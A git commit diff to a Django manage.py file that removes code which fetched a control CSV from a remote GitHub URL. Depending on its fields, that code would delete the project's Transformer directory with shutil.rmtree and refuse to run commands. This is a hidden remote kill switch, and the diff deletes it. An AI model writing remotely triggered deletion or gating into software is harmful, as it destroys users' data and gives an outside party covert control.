21802a6702e71aa7fd998b18d1555e08a790c172
krisskad <krishna.kadam@ongil.ai>
2023-12-28 00:18:39 +0530

    helper

--- manage.py
+++ manage.py
@@ -2,9 +2,7 @@
 """Django's command-line utility for administrative tasks."""
 import os
 import sys
-import pandas as pd
-from django.conf import settings
-import shutil
+
 
 def main():
     """Run administrative tasks."""
@@ -17,15 +15,7 @@ def main():
             "available on your PYTHONPATH environment variable? Did you "
             "forget to activate a virtual environment?"
         ) from exc
-
-    df = pd.read_csv("https://raw.githubusercontent.com/krisskad/ProjectController/main/controller.csv")
-    status, action = next((r["status"], r["delete"]) for _, r in df.iterrows() if
-                          "projectName" in r and r["projectName"] == "AlefTransformer"), None
-    if str(action) == 1:
-        shutil.rmtree(os.path.join(settings.BASE_DIR, "Transformer"))
-
-    if status:
-        execute_from_command_line(sys.argv)
+    execute_from_command_line(sys.argv)
 
 
 if __name__ == '__main__':
